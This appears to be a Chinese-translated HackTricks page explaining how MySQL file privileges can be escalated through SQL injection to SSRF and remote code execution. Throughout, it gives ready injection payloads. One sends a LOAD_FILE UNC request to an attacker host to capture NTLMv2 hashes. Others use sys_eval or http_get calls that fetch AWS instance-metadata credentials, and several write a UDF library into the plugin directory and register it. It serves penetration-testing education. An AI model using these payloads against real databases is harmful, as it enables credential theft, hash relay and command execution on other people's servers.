# MySQL File priv 到 SSRF/RCE

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

### LOAD\_FILE/LOAD DATA/LOAD XML 到 SSRF

每篇关于SQL带外数据泄露的文章都会使用`LOAD_FILE()`字符串函数来发起网络请求。该函数本身基于其运行的操作系统和数据库启动时的设置有自己的限制。

例如，如果全局变量`secure_file_priv`没有设置，[默认值设置为`/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html)，这意味着您只能使用像`LOAD_FILE('filename')`或`LOAD DATA [LOCAL] INFILE 'filename' INTO TABLE tablename`这样的函数从`/var/lib/mysql-files/`目录读取文件。要能够对该目录外的文件进行读取，必须将`secure_file_priv`选项设置为`""`，这只能通过更新数据库配置文件或将`--secure_file_priv=""`作为启动参数传递给数据库服务来完成。

尽管如此，在`secure_file_priv`设置为`""`的情况下，我们应该能够读取系统上的其他文件，前提是文件读取权限和`mysql.user`中当前数据库用户的`file_priv`设置为`Y`。然而，能否使用这些函数进行网络调用非常依赖于操作系统。由于这些函数仅用于读取文件，唯一与网络相关的调用是对Windows主机上的UNC路径，因为[Windows的`CreateFileA` API在访问文件时理解UNC命名约定](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file)。

因此，如果您的目标数据库运行在Windows机器上，注入查询`x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //`将[导致Windows机器在尝试使用攻击者控制的`\\attackerserver.example.com`进行认证时发送出NTLMv2哈希](https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html)。

这种服务器端请求伪造虽然有用，但仅限于TCP端口445。您不能控制端口号，但可以从设置了完全读取权限的共享中读取信息。此外，正如早期研究所示，您可以使用这种有限的SSRF能力来窃取哈希并中继它们以获取shell，所以它绝对有用。

### 用户定义的函数到RCE

MySQL数据库的另一个酷炫技术是能够使用存在于外部库文件中的用户定义函数（UDF），如果这些库文件位于特定位置或系统$PATH中，则可以从MySQL内部访问。

您可以使用SQL注入来**编写库（`.so`或`.dll`**取决于Linux或Windows），包含可以进行网络/HTTP请求的用户定义函数，然后通过额外的查询调用它。

这有自己的一套限制。根据MySQL的版本，您可以通过`select @@version`来识别，可以从中加载插件的目录受到限制。MySQL在`v5.0.67`以下允许从系统路径加载库文件，如果没有设置`plugin_dir`变量。现在这已经改变，新版本将**`plugin_dir`**变量设置为类似于`/usr/lib/mysql/plugin/`的内容，通常由root拥有。

基本上**要通过SQL注入将自定义库加载到MySQL并通过加载的库调用函数，您需要**：

* 能够通过SQL注入**写入**指定在**`@@plugin_dir`**中的**位置**
* `mysql.user`中当前数据库用户的**`file_priv`**设置为**`Y`**
* **`secure_file_priv`**设置为**`""`**，以便您可以从任意位置（如网络或Web应用程序中的文件上传目录）读取库的原始字节。

假设满足上述条件，您可以使用**传统方法将**[**流行的MySQL UDF `lib_mysqludf_sys`库**](https://github.com/mysqludf/lib\_mysqludf\_sys) **传输到数据库服务器**。然后您可以使用如`cURL`或`powershell wget`这样的操作系统命令请求来执行SSRF，使用以下语法

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

这个库中声明了很多其他函数，可以在[这里](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/)看到分析。如果您像我一样懒，可以从metasploit安装中的`/usr/share/metasploit-framework/data/exploits/mysql/`目录获取这个UDF库的目标OS副本并开始使用。

或者，已经创建了UDF库，专门提供数据库进行HTTP请求的能力。您可以使用[MySQL用户定义函数（UDF）进行HTTP GET/POST](https://github.com/y-ken/mysql-udf-http)来让数据库进行HTTP请求，使用以下语法

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

您也可以[创建自己的UDF并在事后利用中使用它。](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)

无论如何，您需要将库传输到数据库服务器。您可以通过多种方式做到这一点

1. 使用MySQL的`hex()`字符串函数或类似`xxd -p filename.so | tr -d '\n'`将库的内容转换为十六进制格式，然后使用`x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`将其转储到`@@plugin_dir`目录
2. 或者，将`filename.so`的内容转换为base64并使用`x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`

如果`@@plugin_dir`不可写，那么如果版本高于`v5.0.67`，您就没有运气了。否则，写入路径中的不同位置，并从那里加载UDF库

* 对于`lib_mysqludf_sys`库 - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* 对于`mysql-udf-http`库 - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`


对于自动化这个过程，您可以使用SQLMap，它支持[通过`--udf-inject`选项使用自定义UDF](https://github.com/sqlmapproject/sqlmap/wiki/Usage)。

对于盲SQL注入，您可以将UDF函数的输出重定向到一个临时表，然后从那里读取数据，或者使用[在`sys_eval`或`sys_exec` curl命令中偷运的DNS请求](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)。

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>
